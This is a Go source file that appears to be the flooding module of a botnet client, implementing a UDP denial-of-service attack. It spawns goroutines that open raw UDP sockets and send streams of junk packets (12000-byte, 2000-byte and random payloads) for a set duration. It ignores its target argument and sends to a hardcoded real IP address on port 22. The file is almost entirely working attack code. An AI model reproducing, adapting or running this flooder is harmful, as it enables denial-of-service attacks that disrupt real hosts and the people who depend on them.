package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func Udp(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go udpcon(target, port)
		time.Sleep(100 * time.Millisecond)
		go udpcon(target, port)
	}

}

func udpcon(target string, port string) {
UDP:
	// con, err := net.Dial("udp", target+":"+port)

	// con = con
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)

	if err != nil {
		fmt.Println(err)
		goto UDP
	}

	for i := 0; i < 20; i++ {
		select {
		case <-balancer.BalanceCh:

			fmt.Println("balancer")
			time.Sleep(5 * time.Second)
		default:

			go sendudp(fd, "nilpayload", 12000)
			go sendudp(fd, "maxpayload", 2000)
			go sendudp(fd, "random", 1000)

			time.Sleep(500 * time.Millisecond)
		}
	}
}

func sendudp(fd int, payload string, size int) {
	var packet []byte

	switch payload {
	case "nilpayload":
		payload := make([]byte, size)

		payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
		packet = payload
	case "maxpayload":
		payload := make([]byte, 0)

		for i := 0; i <= size; i++ {
			payload = append(payload, byte(utils.RandomInt(2)))
		}

		packet = payload

	case "random":
		var bytestr string

		for i := 0; i <= size; i++ {
			bytestr += strconv.Itoa(utils.RandomInt(2))
		}

		var res string
		for _, i := range bytestr {
			res += string(i >> 4 * 4)
		}
		packet = []byte(res)

	}

	fmt.Println(len(packet))
	addr := syscall.SockaddrInet4{
		Port: 22,
		Addr: [4]byte{185, 166, 196, 212},
	}
	err := syscall.Sendto(fd, packet, 0, &addr)
	// fmt.Println(len(payload))
	if err != nil {
		fmt.Println(err)
		return
	}
}
